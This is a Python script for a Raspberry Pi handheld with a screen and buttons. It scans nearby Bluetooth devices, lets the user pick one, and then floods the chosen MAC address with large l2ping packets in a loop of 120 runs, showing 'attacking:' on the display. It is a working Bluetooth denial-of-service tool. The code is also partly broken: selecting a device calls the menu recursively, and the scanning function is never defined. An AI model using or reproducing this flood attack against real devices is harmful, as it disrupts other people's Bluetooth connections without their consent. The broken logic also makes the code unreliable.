from PIL import Image, ImageDraw, ImageFont
import time
import RPi.GPIO as GPIO
import subprocess
import signal
import os
import bluetooth





def bluetooth_menu(disp, original_img, GPIO, BUTTON_UP, BUTTON_DOWN, BUTTON_SELECT):
    font = ImageFont.load_default()
    mac_addresses = scan_bluetooth_devices()
    cursor = 0

    while True:
        img = original_img.copy()
        draw = ImageDraw.Draw(img)

        if not mac_addresses:
            draw.text((15, 20), "No devices found", font=font, fill="white")
            disp.display(img)
            time.sleep(2)
            return None

        y = 20
        for i, addr in enumerate(mac_addresses):
            prefix = ">" if i == cursor else " "
            draw.text((5, y), f"{prefix} {addr}", font=font, fill="white")
            y += 15

        disp.display(img)

        if GPIO.input(BUTTON_UP) == GPIO.LOW:
            cursor = (cursor - 1) % len(mac_addresses)
            time.sleep(0.15)

        if GPIO.input(BUTTON_DOWN) == GPIO.LOW:
            cursor = (cursor + 1) % len(mac_addresses)
            time.sleep(0.15)
        if GPIO.input(BUTTON_SELECT) == GPIO.LOW:     
            selected_mac = bluetooth_menu(disp, original_img, GPIO, BUTTON_UP, BUTTON_DOWN, BUTTON_SELECT)

            command = ["timeout", "1", "sudo", "l2ping", "-s", "600", "-f", selected_mac]
            print(f"l2ping {selected_mac}")               
            # Вивести статус на екран
            #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
            img = original_img.copy()
            draw = ImageDraw.Draw(img)
            
            for i in range(120):
                subprocess.run(command)
                #draw.rectangle((40, 30, 160, 50), outline="black", fill="black")
                img = original_img.copy()
                draw = ImageDraw.Draw(img)
                draw.text((40, 10), f"attacking:", fill="white")
                draw.text((5, 20), f"{selected_mac}", fill="white")
                draw.text((40, 30), f"at {i+1}", fill="white")
                disp.display(img)

            time.sleep(1)
            break
